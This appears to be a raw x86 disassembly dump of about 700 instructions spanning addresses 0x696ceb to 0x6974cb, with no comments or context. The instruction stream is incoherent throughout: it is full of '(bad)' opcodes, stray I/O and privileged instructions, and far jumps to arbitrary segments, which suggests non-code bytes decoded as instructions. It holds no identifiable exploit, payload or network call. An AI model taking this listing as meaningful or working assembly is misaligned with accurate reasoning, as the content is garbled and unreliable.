  696ceb:	mov    ebp,0x6284207d
  696cf0:	jne    0x696d11
  696cf2:	or     eax,0x709224e5
  696cf7:	xor    al,0x2e
  696cf9:	popf   
  696cfa:	cwde   
  696cfb:	icebp  
  696cfc:	sbb    edi,DWORD PTR [edx]
  696cfe:	cs pop ebp
  696d00:	fdivr  DWORD PTR [edx+0x1e]
  696d03:	sbb    esi,eax
  696d05:	bound  ecx,QWORD PTR [ebx]
  696d07:	dec    ebp
  696d08:	leave  
  696d09:	dec    ebx
  696d0a:	(bad)  
  696d0b:	pushf  
  696d0c:	and    dl,BYTE PTR [eax]
  696d0e:	ffree  st(1)
  696d10:	sbb    bl,BYTE PTR [ebx]
  696d12:	data16 cmp al,BYTE PTR [ebp-0x62]
  696d16:	jns    0x696d96
  696d18:	ret    
  696d19:	data16 outs dx,BYTE PTR ds:[esi]
  696d1b:	mov    ebx,0xea523ecc
  696d20:	neg    DWORD PTR [edi]
  696d22:	ins    DWORD PTR es:[edi],dx
  696d23:	aad    0x10
  696d25:	xchg   edi,eax
  696d26:	dec    esp
  696d27:	xor    BYTE PTR [ecx+0x75],al
  696d2a:	test   DWORD PTR [ebx*8-0x6c21ee0e],ecx
  696d31:	sbb    DWORD PTR [eax+0x14],esi
  696d34:	loop   0x696da2
  696d36:	out    0x5e,al
  696d38:	call   0x185ccfda
  696d3d:	stos   DWORD PTR es:[edi],eax
  696d3e:	and    BYTE PTR [edi],cl
  696d40:	frstor [eax-0x23]
  696d43:	imul   ebp,DWORD PTR [esp+ecx*8],0x87add3
  696d4a:	jmp    0x436d:0xf9f54f33
  696d51:	xchg   ebp,eax
  696d52:	jg     0x696d79
  696d54:	or     BYTE PTR [ecx],ch
  696d56:	fcomp  DWORD PTR [ecx]
  696d58:	push   ds
  696d59:	push   esi
  696d5a:	push   ss
  696d5b:	retf   
  696d5c:	fs pop ss
  696d5e:	std    
  696d5f:	sub    eax,0x2e325109
  696d64:	(bad)  
  696d65:	push   ebp
  696d66:	mov    es,WORD PTR [ebx-0x5f]
  696d69:	call   0x56cf4033
  696d6e:	push   0xffffffab
  696d70:	jmp    0x696d52
  696d72:	jne    0x696d31
  696d74:	or     BYTE PTR [ebx+0x134e0c1d],0xf2
  696d7b:	into   
  696d7c:	bound  edi,QWORD PTR [esi-0x28bccd7f]
  696d82:	mov    eax,edi
  696d84:	xor    DWORD PTR [ecx-0x4bf9d863],ebx
  696d8a:	imul   edi
  696d8c:	jno    0x696d16
  696d8e:	xchg   edi,eax
  696d8f:	into   
  696d90:	cmp    esi,DWORD PTR [eax+0x354c8506]
  696d96:	pusha  
  696d97:	push   esp
  696d98:	ins    BYTE PTR es:[edi],dx
  696d99:	sub    BYTE PTR [ebx+eiz*2+0x2c],dh
  696d9d:	sub    al,0xc3
  696d9f:	jb     0x696da5
  696da1:	shl    DWORD PTR [edi-0x73],cl
  696da4:	cmp    di,WORD PTR [esi-0x5c]
  696da8:	(bad)  
  696da9:	push   esi
  696daa:	fs pop esi
  696dac:	push   eax
  696dad:	sti    
  696dae:	imul   ebp,edx,0xe05c6857
  696db4:	mov    edi,0x15c40d97
  696db9:	push   0x58
  696dbb:	ja     0x696dd4
  696dbd:	std    
  696dbe:	xor    dh,al
  696dc0:	jg     0x696da8
  696dc2:	sbb    DWORD PTR [eax+0x1],ebp
  696dc5:	push   eax
  696dc6:	fld    DWORD PTR [eax]
  696dc8:	push   cs
  696dc9:	fcmovnu st,st(1)
  696dcb:	rcl    BYTE PTR [ebp-0xe],cl
  696dce:	imul   esp,ecx,0x4
  696dd1:	mov    ds:0xb8a10e8e,eax
  696dd6:	xchg   esi,eax
  696dd7:	lock push 0x68e5d53c
  696ddd:	mov    al,0xb
  696ddf:	add    ah,BYTE PTR [edx]
  696de1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  696de2:	sub    al,0x6e
  696de4:	xor    al,0x22
  696de6:	maskmovq mm2,(bad)
  696de7:	not    DWORD PTR [ecx-0x39]
  696dea:	ds mov ss:0xa624f23e,al
  696df1:	mov    dh,0x36
  696df3:	mov    dh,0xb8
  696df5:	int3   
  696df6:	dec    esi
  696df7:	mov    dh,0x9a
  696df9:	xor    BYTE PTR [ecx],bl
  696dfb:	test   DWORD PTR [eax-0xaf0be31],ecx
  696e01:	test   al,0xce
  696e03:	jmp    0x696e7c
  696e05:	out    0x18,eax
  696e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  696e08:	pop    edx
  696e09:	dec    esp
  696e0a:	in     eax,0x8b
  696e0c:	ror    DWORD PTR [esi+0x642f24d9],0xea
  696e13:	fnsave cs:[eax]
  696e16:	inc    esi
  696e17:	jbe    0x696e7d
  696e19:	xchg   bl,bh
  696e1b:	push   0xfffffff5
  696e1d:	mov    eax,0xf6a62b16
  696e22:	(bad)  
  696e23:	xchg   ebx,eax
  696e24:	lock (bad) 
  696e26:	mov    al,ds:0xa0732554
  696e2b:	xchg   ebp,eax
  696e2c:	or     al,0xd2
  696e2e:	adc    BYTE PTR [ecx+ecx*2+0x1c182320],bl
  696e35:	retf   
  696e36:	pop    esi
  696e37:	add    eax,0xb8c34509
  696e3c:	xor    al,0xcd
  696e3e:	call   DWORD PTR [edx-0x2f59e5ce]
  696e44:	stos   BYTE PTR es:[edi],al
  696e45:	xchg   esp,eax
  696e46:	cmp    DWORD PTR ds:0x1540c829,esp
  696e4c:	mov    ah,0x2
  696e4e:	jmp    0x4ba64a90
  696e53:	cmp    cl,bl
  696e55:	popa   
  696e56:	fadd   st,st(2)
  696e58:	push   ebx
  696e59:	les    ebp,FWORD PTR ds:0x6c5ea52d
  696e5f:	add    al,0xa9
  696e61:	mov    WORD PTR [ebx],es
  696e63:	ss xor al,0x7f
  696e66:	cmc    
  696e67:	and    eax,0x818239d6
  696e6c:	fidiv  DWORD PTR [edx]
  696e6e:	test   ecx,ebp
  696e70:	ret    
  696e71:	xchg   ebx,eax
  696e72:	popa   
  696e73:	jo     0x696e93
  696e75:	add    eax,0x40bffd82
  696e7a:	ficom  WORD PTR [esi-0x12ec3afb]
  696e80:	push   es
  696e81:	adc    bl,BYTE PTR [edx+0x7708a191]
  696e87:	mov    bh,0x25
  696e89:	add    bh,al
  696e8b:	push   0xffffffd1
  696e8d:	mov    edx,0xf4e82149
  696e92:	into   
  696e93:	mov    BYTE PTR [esi+0x2cba57d8],0x5b
  696e9a:	jbe    0x696f0e
  696e9c:	out    dx,eax
  696e9d:	std    
  696e9e:	jns    0x696e43
  696ea0:	xchg   edx,eax
  696ea1:	in     al,dx
  696ea2:	jo     0x696ee8
  696ea4:	inc    edi
  696ea5:	out    0xc7,al
  696ea7:	mov    edx,0x636c0c9b
  696eac:	add    bh,bl
  696eae:	iret   
  696eaf:	or     esi,ecx
  696eb1:	imul   eax,DWORD PTR [ebx],0xfffffff4
  696eb4:	inc    edi
  696eb5:	call   0x36f9:0x38590e64
  696ebc:	aas    
  696ebd:	adc    al,ah
  696ebf:	jge    0x696ec3
  696ec1:	dec    ebp
  696ec2:	cmp    ch,BYTE PTR [edx+0x4f]
  696ec5:	icebp  
  696ec6:	and    BYTE PTR [eax+edx*1+0x77686573],bh
  696ecd:	stos   DWORD PTR es:[edi],eax
  696ece:	pop    esp
  696ecf:	std    
  696ed0:	ret    0xb14a
  696ed3:	stc    
  696ed4:	mov    al,0x47
  696ed6:	(bad)  
  696ed7:	cmp    esi,ebp
  696ed9:	and    BYTE PTR [edx+0x7361a8d2],0x2c
  696ee0:	mov    esi,DWORD PTR [esp+esi*1+0x37]
  696ee4:	jo     0x696ef4
  696ee6:	cmp    al,ah
  696ee8:	stos   BYTE PTR es:[edi],al
  696ee9:	push   ecx
  696eea:	(bad)  
  696eeb:	rcl    DWORD PTR [esi+0x15],cl
  696eee:	add    al,0x3b
  696ef0:	adc    ch,BYTE PTR [ecx]
  696ef2:	es in  al,0xcb
  696ef5:	aaa    
  696ef6:	dec    ebx
  696ef7:	jne    0x696f29
  696ef9:	inc    esp
  696efa:	cs out 0xd3,eax
  696efd:	jno    0x696e88
  696eff:	jne    0x696f5e
  696f01:	clc    
  696f02:	out    0x72,eax
  696f04:	jno    0x696ed1
  696f06:	cli    
  696f07:	loopne 0x696ec7
  696f09:	pushf  
  696f0a:	(bad)  
  696f0c:	inc    eax
  696f0d:	xchg   ecx,eax
  696f0e:	mov    al,ds:0x9425dad
  696f13:	inc    BYTE PTR [ebp+0x66]
  696f16:	xor    al,bl
  696f18:	adc    al,0xe8
  696f1a:	fs test al,0x52
  696f1d:	adc    ah,al
  696f1f:	rol    BYTE PTR [eax],1
  696f21:	xchg   edx,eax
  696f22:	mov    ah,0x6c
  696f24:	mov    esp,0x42380b86
  696f29:	bound  edi,QWORD PTR [esi+ebp*8-0x1c]
  696f2d:	int    0x30
  696f2f:	das    
  696f30:	sbb    al,0xc8
  696f32:	out    dx,al
  696f33:	push   ecx
  696f34:	fisttp QWORD PTR [ebx+0x6f]
  696f37:	inc    ebp
  696f38:	dec    ebp
  696f39:	inc    ecx
  696f3a:	push   ss
  696f3b:	add    eax,0x6faedb63
  696f40:	call   0x9189:0x12790752
  696f47:	add    al,0x85
  696f49:	xchg   ebp,eax
  696f4a:	rol    BYTE PTR [ecx+eax*2],1
  696f4d:	scas   al,BYTE PTR es:[edi]
  696f4e:	ret    
  696f4f:	adc    eax,0x8c46c209
  696f54:	pop    eax
  696f55:	addr16 cli 
  696f57:	pushf  
  696f58:	and    DWORD PTR [ecx+edx*8-0xd],esp
  696f5c:	loopne 0x696f5e
  696f5e:	cmp    al,0x61
  696f60:	mov    al,0x6c
  696f62:	jo     0x696ef7
  696f64:	dec    ebx
  696f65:	aam    0xf8
  696f67:	ficomp DWORD PTR es:[esi-0x56]
  696f6b:	js     0x696f27
  696f6d:	in     eax,0x89
  696f6f:	and    edx,DWORD PTR [esi]
  696f71:	or     bh,dl
  696f73:	aad    0xfb
  696f75:	add    DWORD PTR [eax+0x705b124e],0x8239ae6b
  696f7f:	les    esi,FWORD PTR [esp+eiz*2-0x5e]
  696f83:	or     ah,bl
  696f85:	xchg   ebx,eax
  696f86:	out    dx,eax
  696f87:	push   dx
  696f89:	sbb    ecx,ebp
  696f8b:	(bad)  
  696f8c:	call   0x1a62:0xcb3a4b79
  696f93:	pop    esp
  696f94:	mov    ds:0xb3cd2594,al
  696f99:	mov    edi,0x83864c7
  696f9e:	stos   DWORD PTR es:[edi],eax
  696f9f:	xor    eax,0xdea8efca
  696fa4:	and    al,0xfc
  696fa6:	push   esi
  696fa7:	nop
  696fa8:	out    dx,al
  696fa9:	push   ebx
  696faa:	ror    DWORD PTR [edi-0x1c],cl
  696fad:	jmp    0x77fbf5ff
  696fb2:	imul   eax,DWORD PTR [esi-0xc46f56f],0x44d3abf3
  696fbc:	jl     0x696f78
  696fbe:	(bad)  
  696fc0:	std    
  696fc1:	int3   
  696fc2:	sub    cl,BYTE PTR [eax+0x240e983f]
  696fc8:	int3   
  696fc9:	ins    DWORD PTR es:[edi],dx
  696fca:	repnz cmp DWORD PTR [ebx+0x31852bf0],esi
  696fd1:	mov    eax,ds:0xca1e5083
  696fd6:	dec    esp
  696fd7:	mov    bh,0x3e
  696fd9:	mov    ?,WORD PTR [eax+0x5]
  696fdc:	and    al,0xa8
  696fde:	imul   eax,DWORD PTR [ebx+0x4b9f988d],0x53dc1650
  696fe8:	or     dh,ch
  696fea:	xor    BYTE PTR [ecx+esi*4],ch
  696fed:	inc    eax
  696fee:	push   esp
  696fef:	jb     0x697002
  696ff1:	pop    eax
  696ff2:	pop    esp
  696ff3:	xor    eax,0xffd82394
  696ff8:	scas   al,BYTE PTR es:[edi]
  696ff9:	sbb    al,0xaf
  696ffb:	imul   DWORD PTR [ebx]
  696ffd:	outs   dx,DWORD PTR ds:[esi]
  696ffe:	fld    TBYTE PTR [edi+0x7d2275b9]
  697004:	dec    eax
  697005:	add    BYTE PTR [edi+0x4b4a54e],ah
  69700b:	fld    TBYTE PTR [esi]
  69700d:	ror    edx,1
  69700f:	cdq    
  697010:	hlt    
  697011:	add    bl,BYTE PTR [ebp+eiz*4-0x4f29fa01]
  697018:	adc    esp,ebx
  69701a:	hlt    
  69701b:	pushf  
  69701c:	scas   al,BYTE PTR es:[edi]
  69701d:	jns    0x696fb9
  69701f:	adc    edx,DWORD PTR [ecx+0x31]
  697022:	dec    edi
  697023:	scas   al,BYTE PTR es:[edi]
  697024:	jae    0x697010
  697026:	call   0x8e88e607
  69702b:	repnz es push ds
  69702e:	dec    esi
  69702f:	push   ss
  697030:	xor    al,0x68
  697032:	jnp    0x69702c
  697034:	cdq    
  697035:	jl     0x696fd2
  697037:	dec    edx
  697038:	sbb    edx,edx
  69703a:	push   ds
  69703b:	es xor al,0xbb
  69703e:	cmc    
  69703f:	call   0x6f8663f1
  697044:	ja     0x697065
  697046:	sbb    BYTE PTR [esp+edx*1+0x43fbc546],al
  69704d:	je     0x696fd8
  69704f:	hlt    
  697050:	mov    edx,0x169af846
  697055:	inc    edi
  697056:	mov    ds:0x7ecab593,eax
  69705b:	jne    0x6970a5
  69705d:	mov    edx,0xa3cbb81c
  697062:	jle    0x6970e3
  697064:	mov    dh,0x32
  697066:	push   cs
  697067:	sub    bh,cl
  697069:	pop    ecx
  69706a:	jae    0x69708e
  69706c:	mov    edi,0x97300d19
  697071:	inc    edi
  697072:	loopne 0x697084
  697074:	cmp    BYTE PTR [edi-0x7c890bed],bh
  69707a:	in     eax,dx
  69707b:	xor    eax,0xffffffb0
  69707e:	aam    0x58
  697080:	loope  0x697060
  697082:	(bad)  
  697083:	dec    esi
  697084:	push   esi
  697085:	jmp    0xd297:0x7539c054
  69708c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69708d:	arpl   ax,bx
  69708f:	popa   
  697090:	and    dh,0x1c
  697093:	(bad)  
  697094:	adc    al,0x37
  697096:	mov    ds:0x27778a2e,eax
  69709b:	leave  
  69709c:	and    DWORD PTR [edx+0x65],0x9e598822
  6970a3:	lock out 0x3d,eax
  6970a6:	cmp    DWORD PTR [edi],eax
  6970a8:	or     DWORD PTR [esi],esi
  6970aa:	mov    dh,0x37
  6970ac:	(bad)  
  6970ad:	lods   eax,DWORD PTR ds:[esi]
  6970ae:	pop    esp
  6970af:	pusha  
  6970b0:	stos   DWORD PTR es:[edi],eax
  6970b1:	and    eax,0x4ea724a9
  6970b6:	mov    ds:0xffd2626a,al
  6970bb:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  6970bd:	(bad)  [eax-0x2f]
  6970c0:	sbb    BYTE PTR [esi+0x48d6189e],0xd2
  6970c7:	cmp    BYTE PTR cs:[esi+0x7fac60e],dl
  6970ce:	cmp    ah,BYTE PTR [eax]
  6970d0:	or     dh,bh
  6970d2:	ins    BYTE PTR es:[edi],dx
  6970d3:	adc    DWORD PTR [ecx+ebp*8-0x6b0301f6],ebp
  6970da:	sbb    DWORD PTR [esi-0x4580588c],esp
  6970e0:	fcomp  DWORD PTR [eax+ecx*8-0x10f7e42f]
  6970e7:	inc    eax
  6970e8:	pop    ds
  6970e9:	aaa    
  6970ea:	(bad)  
  6970ec:	vhsubps ymm3,ymm3,YMMWORD PTR [ebp+0x32]
  6970f1:	div    BYTE PTR [ecx-0x56]
  6970f4:	jle    0x6970e2
  6970f6:	xchg   edi,eax
  6970f7:	in     eax,dx
  6970f8:	pop    ecx
  6970f9:	jecxz  0x697107
  6970fb:	scas   al,BYTE PTR es:[edi]
  6970fc:	mov    edx,0x193db35b
  697101:	xchg   esp,eax
  697102:	jmp    0x213fe438
  697107:	jo     0x697188
  697109:	repnz xchg edx,eax
  69710b:	popa   
  69710c:	jns    0x697182
  69710e:	mov    esp,0x2552e833
  697113:	cmp    DWORD PTR [esi+0x78],0x6b
  697117:	sbb    al,dl
  697119:	xor    al,0x1d
  69711b:	jg     0x6970c0
  69711d:	sub    BYTE PTR [edi+ecx*8-0x78],al
  697121:	cmp    edi,eax
  697123:	pop    es
  697124:	and    al,0x6f
  697126:	jb     0x697160
  697128:	clc    
  697129:	and    al,0x62
  69712b:	popf   
  69712c:	mov    bh,0xdb
  69712e:	push   0xffffffd3
  697130:	cmc    
  697131:	out    dx,eax
  697132:	loopne 0x697122
  697134:	jo     0x6970fb
  697136:	shl    BYTE PTR [edi-0x22cff56b],0xc1
  69713d:	xchg   DWORD PTR [esi-0x301802fd],edx
  697143:	mov    ?,WORD PTR [eax]
  697145:	adc    al,0x2
  697147:	cmp    al,0x66
  697149:	sbb    bl,BYTE PTR [esi-0x2e]
  69714c:	xor    eax,0x71894835
  697151:	stos   DWORD PTR es:[edi],eax
  697152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  697153:	xchg   ebx,eax
  697154:	imul   ebx,DWORD PTR [ecx-0x23],0xffffffdd
  697158:	jg     0x697100
  69715a:	pop    eax
  69715b:	pop    ecx
  69715c:	jmp    0x697148
  69715e:	cmp    ah,BYTE PTR [esi-0xa]
  697161:	mov    esi,0x1258fc85
  697166:	push   esp
  697167:	and    BYTE PTR [ebx+edx*1+0x6b],bh
  69716b:	dec    esi
  69716c:	adc    DWORD PTR [ebx+eiz*1],ecx
  69716f:	imul   edi,DWORD PTR [edi],0x9
  697172:	neg    DWORD PTR [eax]
  697174:	icebp  
  697175:	xor    BYTE PTR ds:0xd0da9bb,ah
  69717b:	push   esp
  69717c:	jg     0x69711b
  69717e:	push   esi
  69717f:	xor    bh,BYTE PTR [esp+edx*2]
  697182:	mov    eax,ds:0x4e2c754d
  697187:	pop    ebp
  697188:	in     al,dx
  697189:	lahf   
  69718a:	jbe    0x697147
  69718c:	cdq    
  69718d:	push   eax
  69718e:	adc    BYTE PTR [ecx-0x59711f7],0xa4
  697195:	add    ah,BYTE PTR [edi]
  697197:	cs icebp 
  697199:	sub    dh,BYTE PTR [ebx+0x27ff17bd]
  69719f:	pop    ds
  6971a0:	add    eax,0xa301ce5c
  6971a5:	inc    edx
  6971a6:	repz fsin 
  6971a9:	fiadd  DWORD PTR [edi-0x1556f77c]
  6971af:	sub    cl,ah
  6971b1:	push   ebx
  6971b2:	les    ecx,FWORD PTR [eax+edi*1-0x72]
  6971b6:	lea    edx,[ebx+ebp*8-0x7c82d225]
  6971bd:	push   esp
  6971be:	mov    BYTE PTR [ecx-0x31],cl
  6971c1:	add    eax,0xbfa258fd
  6971c6:	das    
  6971c7:	jne    0x6971a8
  6971c9:	or     DWORD PTR [esi+0x4bf30d3b],0x51
  6971d0:	pusha  
  6971d1:	in     eax,dx
  6971d2:	mov    ecx,0x7a1b7b57
  6971d7:	xchg   ecx,eax
  6971d8:	shl    DWORD PTR [esi],1
  6971da:	dec    edx
  6971db:	fwait
  6971dc:	addr16 pusha 
  6971de:	fsub   QWORD PTR [esi+0x7a]
  6971e1:	pop    edx
  6971e2:	mov    al,BYTE PTR [ebx-0x54feb24c]
  6971e8:	jno    0x6971be
  6971ea:	int    0xe5
  6971ec:	sub    al,0x32
  6971ee:	sbb    al,0x29
  6971f0:	cmp    cl,al
  6971f2:	leave  
  6971f3:	jecxz  0x697247
  6971f5:	jo     0x697256
  6971f7:	jl     0x6971bc
  6971f9:	mov    dh,0xaa
  6971fb:	push   es
  6971fc:	sbb    al,0x4b
  6971fe:	lahf   
  6971ff:	pop    esp
  697200:	mov    al,ds:0x7d39cc53
  697205:	dec    esi
  697206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  697207:	or     ebx,DWORD PTR [ebx+0x3e6fae84]
  69720d:	vcvtss2sd xmm0,xmm6,DWORD PTR [ecx]
  697211:	and    dl,dl
  697213:	das    
  697214:	push   es
  697215:	jno    0x697225
  697217:	loop   0x6971a4
  697219:	pop    ds
  69721a:	or     edx,eax
  69721c:	das    
  69721d:	hlt    
  69721e:	(bad)  
  69721f:	jne    0x69728f
  697221:	sub    edx,DWORD PTR ds:0x9f1b297e
  697227:	cdq    
  697228:	add    ecx,DWORD PTR [edx+0x1a]
  69722b:	adc    BYTE PTR [edx+0x1f99ea9],bh
  697231:	jbe    0x6971db
  697233:	shl    DWORD PTR [edi+ebx*1],1
  697236:	call   0x8a47f8cf
  69723b:	and    BYTE PTR [eax+eax*4+0x304e10cc],0x77
  697243:	jge    0x6971f4
  697245:	(bad)  [esi-0x12]
  697248:	cmp    edx,0x8583758f
  69724e:	sub    eax,0x50da7b90
  697253:	je     0x6971ec
  697255:	imul   ecx,DWORD PTR [bp+di-0x26],0xffffffd2
  69725a:	cdq    
  69725b:	xor    DWORD PTR [edi],ecx
  69725d:	stos   DWORD PTR es:[edi],eax
  69725e:	loope  0x69729f
  697260:	cmp    BYTE PTR [edi-0x4897031a],dh
  697266:	dec    esi
  697267:	rcr    DWORD PTR [ebp-0x43ee07a7],0x24
  69726e:	fmul   QWORD PTR [ecx]
  697270:	ja     0x697209
  697272:	fnstcw WORD PTR [ecx]
  697274:	popa   
  697275:	ss out 0x31,al
  697278:	dec    eax
  697279:	and    DWORD PTR ds:0x39a1aac0,0x92a044f1
  697283:	bound  ecx,QWORD PTR [ecx-0x48bd05d7]
  697289:	dec    esp
  69728a:	xchg   esp,eax
  69728b:	jmp    0x6972ab
  69728d:	push   edi
  69728e:	xchg   esi,eax
  69728f:	fcomp  DWORD PTR [ecx+ebp*4+0x6a]
  697293:	stos   BYTE PTR es:[edi],al
  697294:	sbb    BYTE PTR [eax+edx*4-0x1f788821],bh
  69729b:	ins    DWORD PTR es:[edi],dx
  69729c:	and    DWORD PTR [ebp+eax*4+0x458b55a9],ebx
  6972a3:	and    eax,0x8a613337
  6972a8:	add    eax,0xc6f9fac0
  6972ad:	cmc    
  6972ae:	or     BYTE PTR [esi],al
  6972b0:	jmp    FWORD PTR [ecx-0x65fd0f21]
  6972b6:	mov    eax,ds:0xc1465779
  6972bb:	pop    eax
  6972bc:	stos   DWORD PTR es:[edi],eax
  6972bd:	sbb    esi,edi
  6972bf:	je     0x697260
  6972c1:	ror    DWORD PTR [ecx],0xbc
  6972c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6972c5:	test   al,0x7e
  6972c7:	in     al,0xd
  6972c9:	mov    ah,0x37
  6972cb:	adc    DWORD PTR [edx],edi
  6972cd:	mov    bl,0xc2
  6972cf:	outs   dx,BYTE PTR ds:[esi]
  6972d0:	sub    DWORD PTR [esi],edi
  6972d2:	xchg   ecx,eax
  6972d3:	mov    ds:0x8fdc8743,eax
  6972d8:	dec    ebx
  6972d9:	add    BYTE PTR [ecx],dh
  6972db:	pop    es
  6972dc:	mov    al,ds:0xec054a11
  6972e1:	add    DWORD PTR [edi],ecx
  6972e3:	sar    DWORD PTR [ebx+0x4dec4c4a],cl
  6972e9:	imul   DWORD PTR [ecx]
  6972eb:	lods   eax,DWORD PTR ds:[esi]
  6972ec:	fcomp  QWORD PTR [esi]
  6972ee:	mov    ch,0xf9
  6972f0:	cdq    
  6972f1:	push   esi
  6972f2:	ror    BYTE PTR [ecx-0x32],1
  6972f5:	jbe    0x6972d6
  6972f7:	mov    edx,0x2821533c
  6972fc:	fsub   DWORD PTR ds:[di]
  697300:	es out 0x32,al
  697303:	div    DWORD PTR [ebp+0x16]
  697306:	loope  0x697373
  697308:	cmc    
  697309:	mov    ah,0xbe
  69730b:	and    ebp,DWORD PTR [ecx]
  69730d:	pop    ss
  69730e:	mov    esi,0xd60fab55
  697313:	sub    DWORD PTR [ebx],eax
  697315:	add    cl,BYTE PTR [esi+0x69]
  697318:	fmul   DWORD PTR [ebx]
  69731a:	jl     0x697395
  69731c:	lahf   
  69731d:	std    
  69731e:	inc    ebp
  69731f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  697320:	push   ecx
  697321:	gs mov ebx,0xb434efa6
  697327:	xchg   edx,eax
  697328:	push   ss
  697329:	inc    ebx
  69732a:	arpl   si,bx
  69732c:	xchg   ebx,eax
  69732d:	or     BYTE PTR [esi],dh
  69732f:	push   esi
  697330:	loopne 0x697307
  697332:	xchg   esi,eax
  697333:	fadd   DWORD PTR [ebp+0x7d]
  697336:	ret    0xbe7e
  697339:	repnz xor eax,0x39755f6e
  69733f:	(bad)  
  697340:	scas   eax,DWORD PTR es:[edi]
  697341:	mov    esi,0xe21e4e8a
  697346:	push   edx
  697347:	out    0xc9,eax
  697349:	leave  
  69734a:	hlt    
  69734b:	loopne 0x6972f5
  69734d:	pop    ecx
  69734e:	fiadd  DWORD PTR [ecx+eiz*1]
  697351:	inc    eax
  697352:	test   DWORD PTR [ebp+0x166b2076],eax
  697358:	jle    0x697357
  69735a:	dec    ebx
  69735b:	inc    ecx
  69735d:	jns    0x697388
  69735f:	inc    esi
  697360:	mov    esi,0x33fcc2bf
  697365:	mov    ch,ah
  697367:	mov    al,ds:0xd8408833
  69736c:	sbb    DWORD PTR [edi+0x56],edx
  69736f:	addr16 xchg edi,eax
  697371:	pushf  
  697372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  697373:	sbb    ecx,DWORD PTR [eax+0x51252095]
  697379:	jmp    0xfbc9:0xb3401757
  697380:	and    al,0xf9
  697382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  697383:	je     0x6973c2
  697385:	iret   
  697386:	jmp    0x7e36:0xbc7856c3
  69738d:	sbb    dl,ch
  69738f:	pop    ds
  697390:	add    DWORD PTR [ecx],esi
  697392:	jmp    0xfc645db2
  697397:	push   eax
  697398:	jp     0x7da227f2
  69739e:	dec    ebp
  69739f:	or     eax,0x806cf9da
  6973a4:	jmp    0x7ffe:0x95282baa
  6973ab:	or     DWORD PTR ds:0xd0780c28,edi
  6973b1:	cli    
  6973b2:	mov    BYTE PTR [ebx+0x55],dh
  6973b5:	(bad)  
  6973b6:	cmp    ch,BYTE PTR [edi]
  6973b8:	(bad)  
  6973b9:	cld    
  6973ba:	xor    al,0x77
  6973bc:	pusha  
  6973bd:	xchg   edx,eax
  6973be:	loope  0x69740d
  6973c0:	mov    BYTE PTR [edi-0x2b],cl
  6973c3:	mov    edi,0x54ebf832
  6973c8:	sbb    BYTE PTR [ebx],dl
  6973ca:	add    BYTE PTR [ecx+0x478ad85e],0x1f
  6973d1:	(bad)  
  6973d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6973d3:	fadd   DWORD PTR [edi-0x70]
  6973d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6973d7:	jne    0x697410
  6973d9:	or     DWORD PTR [esp+ecx*1-0x741361ae],0xfffffff5
  6973e1:	mov    WORD PTR [edi-0x70],cs
  6973e4:	cdq    
  6973e5:	mov    bh,0xf8
  6973e7:	xor    eax,0x7f72c879
  6973ec:	cmp    ebx,DWORD PTR [ecx+0x70134bc]
  6973f2:	jmp    0xa4a6:0x24fedf6e
  6973f9:	jo     0x6973fc
  6973fb:	push   eax
  6973fc:	aam    0x6b
  6973fe:	enter  0xba6f,0x3c
  697402:	ss in  eax,0xea
  697405:	fisub  DWORD PTR [edi]
  697407:	out    dx,eax
  697408:	mov    cl,0xb3
  69740a:	out    dx,al
  69740b:	add    bh,ah
  69740d:	dec    ebx
  69740e:	ds jmp 0x2ec159c0
  697414:	jae    0x6973ea
  697416:	lock cmp eax,0x9a2ae978
  69741c:	popa   
  69741d:	mov    ebp,0xd8660375
  697422:	out    dx,eax
  697423:	repnz cmc 
  697425:	scas   eax,DWORD PTR es:[edi]
  697426:	push   edx
  697427:	call   0xe59f:0x4be04ab2
  69742e:	lods   al,BYTE PTR ds:[esi]
  69742f:	pop    edi
  697430:	cmp    cl,BYTE PTR [edx+0x7]
  697433:	and    al,0x24
  697435:	js     0x697410
  697437:	mov    dh,0x55
  697439:	fild   QWORD PTR [eax-0x28a08ddb]
  69743f:	aam    0x9e
  697441:	sbb    dh,BYTE PTR [ebp-0x6d]
  697444:	ret    
  697445:	call   0xcb67:0x90d77d7c
  69744c:	or     BYTE PTR [edx+0x70],0x69
  697450:	xor    eax,0xcacd96b6
  697455:	dec    esi
  697456:	imul   edi,DWORD PTR [edi-0x5b],0xfffffffe
  69745a:	mov    eax,ds:0x25ebf1d2
  69745f:	jne    0x6974cf
  697461:	mov    DWORD PTR [edx+0x7b],eax
  697464:	sbb    DWORD PTR [ebp*8-0x7e9cf359],edx
  69746b:	jge    0x69742d
  69746d:	dec    eax
  69746e:	pop    esp
  69746f:	ja     0x697427
  697471:	test   BYTE PTR [ecx+ebx*4+0x2b240474],ah
  697478:	xchg   ebp,eax
  697479:	rcl    DWORD PTR [eax-0x4a],0xbd
  69747d:	pop    es
  69747e:	out    dx,al
  69747f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  697480:	add    bh,BYTE PTR [ebp-0x1dee309c]
  697486:	fs mov ecx,0xab21957c
  69748c:	ror    DWORD PTR [eax+0x496d184],cl
  697492:	cld    
  697493:	(bad)  
  697494:	out    0x3d,eax
  697496:	(bad)  
  697497:	or     al,0xb0
  697499:	mov    ebx,0x3fbfacd3
  69749e:	dec    esi
  69749f:	daa    
  6974a0:	outs   dx,DWORD PTR ds:[esi]
  6974a1:	add    ah,bl
  6974a3:	stc    
  6974a4:	call   0xfff9:0x3467f546
  6974ab:	aam    0xe1
  6974ad:	lods   al,BYTE PTR ds:[esi]
  6974ae:	jmp    DWORD PTR [ebx-0x7498a343]
  6974b4:	aam    0x2b
  6974b6:	mov    esp,0x40164fb8
  6974bb:	sub    al,0xce
  6974bd:	mov    edx,0x9ffe68bd
  6974c2:	or     al,0xa0
  6974c4:	stos   BYTE PTR es:[edi],al
  6974c5:	xchg   esi,eax
  6974c6:	jge    0x697529
  6974c8:	hlt    
  6974c9:	dec    ebx
  6974ca:	scas   al,BYTE PTR es:[edi]
  6974cb:	mov    ebp,0xdd92131d
